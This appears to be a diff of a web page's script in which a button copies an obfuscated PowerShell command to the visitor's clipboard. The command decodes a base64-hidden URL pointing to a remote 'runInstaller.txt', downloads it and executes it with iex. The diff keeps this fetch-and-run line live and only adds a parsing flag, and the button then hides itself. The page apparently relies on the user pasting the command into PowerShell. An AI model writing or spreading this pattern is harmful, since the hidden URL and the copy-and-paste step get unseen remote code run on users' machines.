@@ -33,7 +33,7 @@
     </style>
     <script>
         function copyToClipboard() {
-            var command = 'powershell "iex (iwr ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3J5ZGVyNzIyMy9SYW5kb20vcmVmcy9oZWFkcy9tYWluL3J1bkluc3RhbGxlci50eHQ=\')))).Content"';
+            var command = 'powershell "iex (iwr ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3J5ZGVyNzIyMy9SYW5kb20vcmVmcy9oZWFkcy9tYWluL3J1bkluc3RhbGxlci50eHQ=\'))) -UseBasicParsing).Content"';
             navigator.clipboard.writeText(command).then(function() {
                 // Hide the button after it's clicked
                 document.querySelector('button').style.display = 'none';
